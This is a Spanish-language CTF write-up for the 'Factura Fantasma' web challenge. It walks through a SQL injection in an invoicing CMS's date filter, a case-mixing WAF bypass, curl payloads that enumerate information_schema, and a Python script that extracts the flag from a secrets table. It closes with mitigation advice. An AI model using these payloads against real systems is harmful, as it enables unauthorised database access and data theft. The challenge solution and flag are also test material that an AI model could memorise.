---
tipo: laboratorio
tags: [ctf, pentraze, web, medium]
Plataforma: "Pentraze CTF"
Categoría: "Web"
Dificultad: "Medium"
Estado: "Completado"
Puntos: "100"
Flag: "PENTRAZE{77ab85c406db91852f2d2d5ed37c182171c2132ef01c80562711f39ca53c00ef}"
actualizado: 2026-09-24
---
- **Categoría Principal:** [[CTF - Web|Web]]
- **Dificultad:** [[CTF - Medium|Medium]]
- **MOC Principal:** [[PentraZE CTF 2026 - MOC]]
- **Estado:** Completado
- **Puntos:** 100

# Writeup - Factura Fantasma

> [!info] Objetivo
> Infiltrar el CMS de facturación, enumerar la base de datos mediante [[SQL Injection]] y extraer la evidencia del fraude.

- **Target:** `http://34.135.253.132:36229`
- **Autor:** Br0nco
- **Categoría:** Web
- **Dificultad:** Medium
- **Credenciales iniciales:** `lperez:viewer123` (rol `Viewer`)

## Resumen rápido de la cadena de ataque

1. Se entra con las credenciales limitadas dadas en el briefing.
2. El JavaScript de `invoices.php` revela el endpoint oculto `/search.php`.
3. Una comilla en `date_from` provoca un error de MariaDB que reconstruye la consulta.
4. El WAF bloquea palabras completamente en mayúsculas, pero no `UnIoN SeLeCt`.
5. Con diez columnas se extraen tablas, columnas, usuarios y finalmente `secrets.flag`.

## Vulnerabilidades explotadas

- **[[SQL Injection]]** en `date_to`, derivada de una consulta construida con concatenación.
- **[[WAF Bypass]]** mediante case mixing (`UnIoN SeLeCt`).
- **Endpoint oculto no autorizado correctamente:** la búsqueda de negocio era accesible con un rol Viewer.
- **Exposición de errores SQL:** el backend filtró el tipo, la consulta y la tecnología.
- **[[IDOR]]/Broken Access Control potencial:** la superficie de facturas y sus datos debía protegerse por objeto y rol.
- **Enumeración de `information_schema`:** se descubrieron `users` y `secrets` antes de conocer la base de datos.

## Paso a paso técnico

### 1. Login y estructura

```bash
BASE="http://34.135.253.132:36229"

curl -c /tmp/cookies.txt -X POST "$BASE/login.php" \
  --data-urlencode 'username=lperez' \
  --data-urlencode 'password=viewer123'
```

La aplicación era PHP + MariaDB sobre Apache 2.4.68. Las rutas relevantes fueron:

```text
/login.php
/dashboard.php
/invoices.php
/invoice_detail.php
/search.php
/clients.php
/reports.php
/payments.php
/team.php
```

### 2. Descubrimiento del endpoint vulnerable

En `invoices.php`, el JavaScript hacía:

```javascript
fetch('/search.php?' + params.toString())
    .then(r => r.json())
```

Los parámetros soportados eran `date_from`, `date_to`, `status` y `client_id`. La búsqueda normal funcionaba:

```bash
curl -s -b /tmp/cookies.txt \
  "$BASE/search.php?status=paid"
```

La comilla en `date_from` produjo un error de MariaDB que reveló la consulta original:

```sql
SELECT i.*, c.company_name
FROM invoices i
JOIN clients c ON i.client_id = c.id
WHERE i.issue_date >= '$date_from'
  AND i.issue_date <= '$date_to'
ORDER BY i.issue_date DESC
```

El resultado tenía 10 columnas; la décima, `company_name`, se serializaba como texto visible en el JSON. `date_to` quedaba después de `date_from` y podía inyectarse sin romper la comilla inicial.

### 3. Evasión del WAF

El filtro bloqueaba `UNION SELECT` y variantes con comentarios si estaban en mayúsculas exactas. La combinación siguiente pasaba:

```text
UnIoN SeLeCt
```

El bypass de mayúsculas/minúsculas fue suficiente; no fue necesario romper la regla por comentario. La base del payload era:

```text
date_from=2024-01-01
date_to=2099-12-31' UnIoN SeLeCt 1,2,3,4,5,6,7,8,9,<EXPRESIÓN>-- -
```

### 4. Enumerar el esquema

```bash
# Base de datos
curl -s -b /tmp/cookies.txt \
  "$BASE/search.php?date_from=2024-01-01&date_to=2099-12-31'%20UnIoN%20SeLeCt%201,2,3,4,5,6,7,8,9,database()--%20-"

# Tablas
curl -s -b /tmp/cookies.txt \
  "$BASE/search.php?date_from=2024-01-01&date_to=2099-12-31'%20UnIoN%20SeLeCt%201,2,3,4,5,6,7,8,9,group_concat(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20-"
```

Tablas encontradas:

```text
users, payments, secrets, clients, invoices
```

Columnas de `secrets`:

```bash
curl -s -b /tmp/cookies.txt \
  "$BASE/search.php?date_from=2024-01-01&date_to=2099-12-31'%20UnIoN%20SeLeCt%201,2,3,4,5,6,7,8,9,group_concat(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name='secrets'--%20-"
```

```text
id, secret_name, flag
```

La tabla `secrets` era el objetivo final. También se enumeraron usuarios y roles, pero no fue necesario romper los hashes para extraer la flag.

### 5. Explotación automatizada

```python
#!/usr/bin/env python3
import json
import re

import requests

BASE = "http://34.135.253.132:36229"
FLAG_RE = re.compile(r"PENTRAZE\{[^}]+\}")

session = requests.Session()
session.post(
    BASE + "/login.php",
    data={"username": "lperez", "password": "viewer123"},
    timeout=10,
    allow_redirects=False,
)


def sqli(expression, from_clause=""):
    columns = "1,2,3,4,5,6,7,8,9," + expression
    date_to = f"2099-12-31' UnIoN SeLeCt {columns} {from_clause}-- -"
    response = session.get(
        BASE + "/search.php",
        params={"date_from": "2024-01-01", "date_to": date_to},
        timeout=15,
    )
    try:
        invoices = response.json().get("invoices", [])
        if invoices:
            return invoices[-1].get("company_name", "")
    except json.JSONDecodeError:
        pass
    return ""


flag = sqli("group_concat(flag SEPARATOR ' ||| ')", "FROM secrets")
print(f"[*] Flag: {flag}")

match = FLAG_RE.search(flag)
if match:
    print(f"\n🚩 {match.group(0)} 🚩")
```

La respuesta final contenía:

```json
{"company_name":"PENTRAZE{77ab85c406db91852f2d2d5ed37c182171c2132ef01c80562711f39ca53c00ef}"}
```

## Flag

```text
PENTRAZE{77ab85c406db91852f2d2d5ed37c182171c2132ef01c80562711f39ca53c00ef}
```

## Lecciones aprendidas y mitigar

- Usar consultas parametrizadas (`mysqli`/PDO prepared statements) en vez de concatenar `date_from` y `date_to`.
- Validar tipos, formato de fechas y rangos antes de consultar.
- No devolver errores SQL al cliente; registrar internamente y mostrar un error genérico.
- Un WAF no sustituye la corrección de la vulnerabilidad. Si se mantiene, debe tener reglas normalizadas y pruebas adversariales, pero la defensa principal es el acceso seguro a datos.
- Aplicar autorización por rol y objeto en cada endpoint, incluido el buscador.
- Limitar el número de filas, columnas y respuestas visibles para reducir la capacidad de enumeración.
- Proteger `secrets` con controles de acceso separados, mínimo privilegio y auditoría; no exponer la tabla a un Viewer.
- Ejecutar la base de datos con un usuario sin privilegios de escritura y con acceso mínimo al schema.

## Navegación

- ⬆️ Carpeta padre: [[_PentraZE 2026]]
- 🗂️ Categoría: [[CTF - Web]]
- ⬅️ Anterior: [[Writeup - MATRIOSKA|MATRIOSKA]]
- ➡️ Siguiente: [[Writeup - Escaperoom|Escaperoom]]

## Relacionadas

- [[SQL Injection]] — vector principal y técnicas de enumeración.
- [[WAF Bypass]] — normalización de reglas superficiales.
- [[Authentication]] — credenciales Viewer y autorización insuficiente.
- [[Database Security]] — mínimo privilegio y protección de tablas sensibles.
